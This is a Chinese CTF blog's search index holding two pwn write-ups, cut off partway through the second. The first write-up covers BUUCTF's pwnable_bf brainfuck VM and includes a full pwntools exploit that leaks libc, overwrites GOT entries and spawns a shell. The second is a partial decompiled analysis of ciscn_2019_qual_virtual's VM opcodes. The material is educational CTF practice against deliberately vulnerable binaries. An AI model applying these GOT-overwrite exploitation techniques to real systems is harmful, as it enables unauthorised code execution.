<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024-12第三周：pwnable_bf</title>
      <link href="/2024/12/19/2024-12%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9Apwnable_bf/"/>
      <url>/2024/12/19/2024-12%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9Apwnable_bf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目地址：<a href="https://buuoj.cn/challenges#pwnable_bf">BUUCTF在线评测</a><br>vmpwn专题-2</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/cd644ea16a968acdba5a681a792795f3_MD5.jpeg"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>一个brainfuck虚拟机<br><img src="/EXP_FILE/b67c8a860502406ff58f392b38fe6b16_MD5.jpeg"><br>p是一个全局指针，指向 bss段的 tape </p><p>对opcode的解析相对比较简单<br><img src="/EXP_FILE/d6a656b9d268ab3149335e6f8ab74fdc_MD5.jpeg"></p><ul><li>“+”：++*p，tape存储的值+1</li><li>“,”：输入一个字节到*p</li><li>“-“：–*p，tape存储的值-1</li><li>“.”：打印*p一个字节 </li><li>“&lt;”：–p，p所指地址-1</li><li>“&gt;”：++p，p所指地址+1</li><li>“[“：没用</li></ul><p>因为没对p做出任何限制，所以可以任意地址读写</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>现在能做的：</p><ol><li>增&#x2F;减任意地址一字节</li><li>输入&#x2F;输出任意地址任意字节<br>partial relro，bss 又离 GOT 很近，可以直接改 GOT 表</li></ol><p>我一开始想如何泄露完libc后再回到main上，改GOT为main？</p><p>其实不需要，opcode先泄露再输入，这样泄露完libc后程序会等待输入，我们就可以改GOT了</p><p>发现改成one_gadget没用，那么只能走system(‘&#x2F;bin&#x2F;sh’)，但是putchar只能传参一字节，不好直接构造，还是得回到main上<br><img src="/EXP_FILE/7652a8e59b639c045f0b226f95deb0c0_MD5.jpeg"></p><p>思路：</p><ol><li>先打印puts地址泄露libc</li><li>改putchar为main，改memset为gets，改fgets为system，然后回到main时输入 ‘&#x2F;bin&#x2F;sh’<br><img src="/EXP_FILE/b3dc8f8d90135764a3f77fb5964215ca_MD5.jpeg"><br>我一开始想改puts为main，但是主函数还会调用puts，这就相当于调用了很多次main导致程序异常。改putchar就很好，毕竟已经泄露过了libc</li></ol><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#,</span><span class="token comment">#dbg('b *0x0804865A')</span><span class="token comment">#+</span><span class="token comment">#dbg('b *0x08048665')</span><span class="token comment">#leak puts</span>payload<span class="token operator">=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x88</span>payload<span class="token operator">+=</span><span class="token string">'.>.>.>.'</span>payload<span class="token operator">+=</span><span class="token string">'&lt;&lt;&lt;'</span><span class="token comment">#putchar</span>payload<span class="token operator">+=</span><span class="token string">'>'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span><span class="token comment">#memset</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x8</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span><span class="token comment">#fgets</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x20</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span>payload<span class="token operator">+=</span><span class="token string">'.'</span>sla<span class="token punctuation">(</span><span class="token string">'except [ ]'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x8048671'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x8048671</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'gets'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x3a80c execve("/bin/sh", esp+0x28, environ)constraints:  esi is the GOT address of libc  [esp+0x28] == NULL0x3a80e execve("/bin/sh", esp+0x2c, environ)constraints:  esi is the GOT address of libc  [esp+0x2c] == NULL0x3a812 execve("/bin/sh", esp+0x30, environ)constraints:  esi is the GOT address of libc  [esp+0x30] == NULL0x3a819 execve("/bin/sh", esp+0x34, environ)constraints:  esi is the GOT address of libc  [esp+0x34] == NULL0x5f065 execl("/bin/sh", eax)constraints:  esi is the GOT address of libc  eax == NULL0x5f066 execl("/bin/sh", [esp])constraints:  esi is the GOT address of libc  [esp] == NULL'''</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./bf'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-12第二周：ciscn_2019_qual_virtual</title>
      <link href="/2024/12/13/2024-12%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%9Aciscn_2019_qual_virtual/"/>
      <url>/2024/12/13/2024-12%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%9Aciscn_2019_qual_virtual/</url>
      
        <content type="html"><![CDATA[<blockquote><p>赛题地址：<a href="https://buuoj.cn/challenges#ciscn_2019_qual_virtual">BUUCTF在线评测</a></p></blockquote><p>vmpwn初探</p><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/6b35aee306536e9016983f2737a30397_MD5.jpeg"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="各虚拟段初始化"><a href="#各虚拟段初始化" class="headerlink" title="各虚拟段初始化"></a>各虚拟段初始化</h2><p><img src="/EXP_FILE/cbad4ec09039da31682729a93cf874c9_MD5.jpeg"><br>如图：<br><img src="/EXP_FILE/eab6d937744654ea3eadfbf50981a3ad_MD5.jpeg"></p><h2 id="opcode解析部分"><a href="#opcode解析部分" class="headerlink" title="opcode解析部分"></a>opcode解析部分</h2><p>将我们输入的指令转为opcode<br><img src="/EXP_FILE/ec885429b943018f0189461ba9692f22_MD5.jpeg"></p><ul><li>copy<br>即以每8字节为单位赋值：<code>*(segment+idx++)=a2</code><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                 <span class="token comment">// 0</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>              <span class="token comment">// if(v3==size)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>a1 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">=</span> a2<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>                     <span class="token comment">// idx=v3</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="opcode执行部分"><a href="#opcode执行部分" class="headerlink" title="opcode执行部分"></a>opcode执行部分</h2><p><img src="/EXP_FILE/b17e9f18d757fb913521b21fb1beddb5_MD5.jpeg"></p><ul><li>get<br>即取出 opcode 并返回：<code>*a2=*(segment+idx--)</code><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>a1 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><ul><li>push<pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">get</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>从stack取出数据，放到data里</p><ul><li><p>pop</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">pop</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">copy</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data取出数据，放到stack里</p></li><li><p>add</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> v3 <span class="token operator">+</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相加，放到data</p></li><li><p>sub</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2 <span class="token operator">-</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相减，放到data</p></li><li><p>mul</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">mul</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> v3 <span class="token operator">*</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相乘，放到data</p></li><li><p>div</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">div</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2 <span class="token operator">/</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相除，放到data</p></li><li><p>load</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>data_addr <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>data_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a2<span 